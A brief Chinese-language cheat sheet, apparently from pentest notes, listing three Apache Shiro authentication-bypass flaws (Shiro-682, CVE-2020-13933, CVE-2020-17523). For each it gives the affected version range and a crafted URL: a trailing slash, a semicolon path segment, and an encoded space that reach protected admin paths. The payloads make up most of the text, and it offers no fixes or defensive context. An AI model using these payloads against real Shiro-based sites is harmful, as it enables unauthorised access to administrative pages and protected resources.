## Shiro-682

```http
Shiro 1.3.2
Shiro < 1.5.0
```

```bash
/admin/1/
即URL结尾添加反斜杠绕过权限验证
```

## CVE-2020-13933

```http
Shiro < 1.6.0
```

```http
xxx.com/res/;name

当请求的资源存在时即可绕过权限验证查看资源
```

[@三六零CERT](https://mp.weixin.qq.com/s/PEpYoVZerLKq4Bn3b4wjdg)

## CVE-2020-17523

```http
Apache Shiro < 1.7.1
```

```http
xxx.com/admin/%20
空格绕过了权限验证
```

[@jweny](https://github.com/jweny/shiro-cve-2020-17523)